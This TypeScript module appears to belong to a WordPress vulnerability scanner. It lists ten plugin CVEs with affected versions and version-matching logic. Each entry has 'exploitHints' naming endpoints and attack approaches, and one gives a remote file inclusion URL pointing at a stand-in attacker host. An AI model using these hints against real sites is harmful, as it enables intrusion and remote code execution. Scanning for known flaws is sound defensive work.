export interface WpVulnerability {
  cveId: string;
  aliases?: string[];
  pluginSlug: string;
  pluginName: string;
  affectedRange: string;
  fixedIn?: string;
  severity?: string;
  summary: string;
  exploitHints: string[];
  references: string[];
  affected: {
    gte?: string;
    lt?: string;
    lte?: string;
  };
}

export interface WpVulnerabilityMatch extends WpVulnerability {
  matchedVersion?: string;
}

export const WP_VULNERABILITY_DB: WpVulnerability[] = [
  {
    cveId: "CVE-2023-6553",
    pluginSlug: "backup-backup",
    pluginName: "Backup Migration / BackupBliss",
    affectedRange: "<= 1.3.7",
    fixedIn: "1.3.8",
    severity: "critical",
    summary: "Unauthenticated remote code execution through the backup-heart.php content-dir include path.",
    exploitHints: [
      "Probe /wp-content/plugins/backup-backup/includes/backup-heart.php with a content-dir PHP header, then trigger the same endpoint with cmd=.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-6553"],
    affected: { lte: "1.3.7" },
  },
  {
    cveId: "CVE-2023-3452",
    pluginSlug: "canto",
    pluginName: "Canto",
    affectedRange: "<= 3.0.4",
    fixedIn: "3.0.5",
    severity: "critical",
    summary: "Unauthenticated file inclusion through wp_abspath in includes/lib/get.php.",
    exploitHints: [
      "Try /wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://<attacker>/payload for RFI, or php://filter for LFI-style reads.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-3452"],
    affected: { lte: "3.0.4" },
  },
  {
    cveId: "CVE-2020-25213",
    pluginSlug: "wp-file-manager",
    pluginName: "WP File Manager",
    affectedRange: "<= 6.8",
    fixedIn: "6.9",
    severity: "critical",
    summary: "Unauthenticated arbitrary file upload through the exposed elFinder connector.",
    exploitHints: [
      "POST a PHP payload to /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php using elFinder upload parameters, then request it from wp-content/plugins/wp-file-manager/lib/files/.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-25213"],
    affected: { lte: "6.8" },
  },
  {
    cveId: "CVE-2020-24186",
    pluginSlug: "wpdiscuz",
    pluginName: "wpDiscuz",
    affectedRange: "<= 7.0.4",
    fixedIn: "7.0.5",
    severity: "critical",
    summary: "Unauthenticated arbitrary file upload through comment attachment handling.",
    exploitHints: [
      "Look for wpDiscuz comment forms and test the upload endpoint for extension/MIME bypasses that place files under wp-content/uploads/wpdiscuz/.",
    ],
    references: ["https://wpscan.com/vulnerability/92ae2765-dac8-49dc-a361-99c799573e61/"],
    affected: { lte: "7.0.4" },
  },
  {
    cveId: "CVE-2023-32243",
    pluginSlug: "essential-addons-for-elementor-lite",
    pluginName: "Essential Addons for Elementor",
    affectedRange: "5.4.0 - 5.7.1",
    fixedIn: "5.7.2",
    severity: "critical",
    summary: "Unauthenticated privilege escalation through password reset key abuse.",
    exploitHints: [
      "Check plugin AJAX actions for the password reset flow; vulnerable installs allow unauthenticated reset of arbitrary users including admin.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-32243"],
    affected: { gte: "5.4.0", lte: "5.7.1" },
  },
  {
    cveId: "CVE-2023-28121",
    pluginSlug: "woocommerce-payments",
    pluginName: "WooCommerce Payments",
    affectedRange: "<= 5.6.1",
    fixedIn: "5.6.2",
    severity: "critical",
    summary: "Authentication bypass and privilege escalation in WooCommerce Payments.",
    exploitHints: [
      "If woocommerce-payments is active and old, check for unauthenticated header/REST routes that impersonate privileged users.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-28121"],
    affected: { lte: "5.6.1" },
  },
  {
    cveId: "CVE-2024-27956",
    pluginSlug: "wp-automatic",
    pluginName: "WP Automatic",
    affectedRange: "< 3.92.1",
    fixedIn: "3.92.1",
    severity: "critical",
    summary: "Unauthenticated SQL injection in WP Automatic.",
    exploitHints: [
      "Probe WP Automatic public endpoints for SQLi and credential extraction; successful exploitation often leads to admin account creation.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-27956"],
    affected: { lt: "3.92.1" },
  },
  {
    cveId: "CVE-2024-1071",
    pluginSlug: "ultimate-member",
    pluginName: "Ultimate Member",
    affectedRange: "2.1.3 - 2.8.2",
    fixedIn: "2.8.3",
    severity: "high",
    summary: "SQL injection through the sorting parameter in vulnerable Ultimate Member releases.",
    exploitHints: [
      "Enumerate Ultimate Member member directory/profile endpoints and test the sorting parameter for SQL injection.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-1071"],
    affected: { gte: "2.1.3", lte: "2.8.2" },
  },
  {
    cveId: "CVE-2023-4596",
    pluginSlug: "forminator",
    pluginName: "Forminator",
    affectedRange: "<= 1.24.6",
    fixedIn: "1.24.7",
    severity: "high",
    summary: "Unauthenticated arbitrary file upload in Forminator form handling.",
    exploitHints: [
      "Find public Forminator forms and test upload fields for extension validation bypass into wp-content/uploads/forminator/.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-4596"],
    affected: { lte: "1.24.6" },
  },
  {
    cveId: "CVE-2020-35489",
    pluginSlug: "contact-form-7",
    pluginName: "Contact Form 7",
    affectedRange: "< 5.3.2",
    fixedIn: "5.3.2",
    severity: "high",
    summary: "Unrestricted file upload in Contact Form 7 before 5.3.2.",
    exploitHints: [
      "Locate Contact Form 7 upload forms and try double-extension/polyglot upload bypasses against the form submit endpoint.",
    ],
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-35489"],
    affected: { lt: "5.3.2" },
  },
];

export const WP_VULNERABLE_PLUGIN_SLUGS = [
  ...new Set(WP_VULNERABILITY_DB.map((entry) => entry.pluginSlug)),
];

export function findWpVulnerabilities(
  pluginSlug: string,
  version: string | undefined,
): WpVulnerabilityMatch[] {
  return WP_VULNERABILITY_DB
    .filter((entry) => entry.pluginSlug === pluginSlug)
    .filter((entry) => version === undefined || isAffectedVersion(version, entry))
    .map((entry) => ({ ...entry, matchedVersion: version }));
}

export function isAffectedVersion(version: string, vuln: WpVulnerability): boolean {
  const normalized = normalizeVersion(version);
  if (!normalized) return false;
  if (vuln.affected.gte && compareVersions(normalized, vuln.affected.gte) < 0) return false;
  if (vuln.affected.lt && compareVersions(normalized, vuln.affected.lt) >= 0) return false;
  if (vuln.affected.lte && compareVersions(normalized, vuln.affected.lte) > 0) return false;
  return true;
}

export function compareVersions(a: string, b: string): number {
  const pa = parseVersionParts(a);
  const pb = parseVersionParts(b);
  const len = Math.max(pa.length, pb.length);
  for (let i = 0; i < len; i++) {
    const av = pa[i] ?? 0;
    const bv = pb[i] ?? 0;
    if (av < bv) return -1;
    if (av > bv) return 1;
  }
  return 0;
}

function normalizeVersion(version: string): string | undefined {
  const match = version.trim().match(/\d+(?:[._-]\d+)*/);
  return match?.[0]?.replace(/[_-]/g, ".");
}

function parseVersionParts(version: string): number[] {
  return version
    .split(".")
    .map((part) => Number.parseInt(part, 10))
    .map((part) => (Number.isFinite(part) ? part : 0));
}
